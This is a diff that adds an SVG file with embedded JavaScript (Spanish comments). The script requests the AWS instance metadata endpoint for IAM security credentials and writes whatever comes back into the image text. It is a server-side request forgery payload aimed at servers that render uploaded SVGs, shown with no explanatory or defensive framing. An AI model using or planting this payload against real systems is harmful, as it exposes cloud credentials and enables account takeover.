@@ -1,0 +1,20 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
+  <rect width="100%" height="100%" fill="lightgray" />
+  <text x="20" y="40" font-size="20" id="metadata-text">Loading metadata...</text>
+  <script type="text/javascript">
+    <![CDATA[
+      // Hacer una solicitud a la metadata de AWS
+      fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+        .then(response => response.text())
+        .then(data => {
+          // Mostrar la metadata obtenida en el SVG
+          var textElement = document.getElementById('metadata-text');
+          textElement.textContent = 'AWS Metadata: ' + data;
+        })
+        .catch(error => {
+          var textElement = document.getElementById('metadata-text');
+          textElement.textContent = 'Error fetching metadata: ' + error;
+        });
+    ]]>
+  </script>
+</svg>
